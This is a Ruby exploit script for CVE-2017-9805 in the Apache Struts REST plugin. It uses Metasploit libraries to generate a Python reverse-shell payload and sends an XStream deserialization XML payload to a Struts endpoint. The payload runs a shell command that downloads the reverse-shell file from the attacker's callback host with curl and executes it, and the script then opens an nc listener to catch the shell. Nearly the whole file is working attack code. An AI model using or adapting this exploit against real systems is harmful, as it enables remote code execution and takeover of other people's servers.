#!/usr/bin/env ruby
# may need to change some things up here. serve up an http service
# via: pythom -m SimpleHTTPServer 
# Tested against struts framework 2.3.31 on RHEL.
#
# ...Mario Ceballos

require 'msfenv'
require 'msf/core'
require 'msf/base'
require 'rex'


host     = ARGV[0]
callback = ARGV[1]

def usage
	puts "[*] CVE-2017-9805 REST Plugin XStream"
	puts "[*] #{$0} <host> <callback>"
	exit
end

usage if ARGV.size < 2

$framework = Msf::Simple::Framework.create(
	:module_types => [ Msf::MODULE_PAYLOAD, Msf::MODULE_ENCODER, Msf::MODULE_NOP ]
)
shell = $framework.payloads.create("python/shell_reverse_tcp")
shellcode = Msf::Simple::Payload.generate_simple(shell,
		{
			'OptionStr' => "LHOST=#{callback} LPORT=1975",
			'Format'    => 'raw',
		})

fd = File.new("mc.py","wb")
fd.write(shellcode)
fd.close

puts "[*] Payload created..."

cmd = "curl http://#{callback}:8000/mc.py -O mc.py ; /usr/bin/python mc.py"

xml = %Q|<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                         <string>/bin/sh</string><string>-c</string><string>#{cmd}</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>adf</name>
                  </filter>
                  <next class="string">afd</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
|

begin
sock = Rex::Proto::Http::Client.new(host, port = "8080", context = {}, ssl = false)

req = sock.request_cgi(
	{
		'uri'   => "/struts2-rest-showcase/orders/4",
		'version' => '1.0',
		'method' => 'POST',
		'ctype' => 'application/xml',
		'data' => xml,

	})

	sock.send_request(req)
	data = sock.read_response()
	File.unlink("mc.py")
	system("nc -v -l 1975")
	exit
rescue => e
	puts "[!] #{e}"
	exit
end
